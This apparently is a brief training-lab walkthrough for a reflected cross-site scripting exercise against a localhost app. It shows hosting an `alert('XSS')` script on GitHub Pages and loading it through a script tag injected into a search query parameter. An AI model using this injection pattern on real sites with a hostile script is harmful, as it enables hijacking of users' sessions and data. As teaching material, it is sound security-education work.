# How to Hack

- Now we need to host our alert payload somewhere on GitHub
- We can e.g. create a new repository, add a file called `xss.js` with the content `alert('XSS');`
- Now, we host this repository via `GitHub Pages`
    - We can now access this file via `https://dub-flow.github.io/xss-test/xss.js`
- Finally, we do the same as in `../day-2` but provide the link to the `xss.js`, e.g.: http://localhost:3000/search?term=<script%20src="https://dub-flow.github.io/xss-test/xss.js"></script>
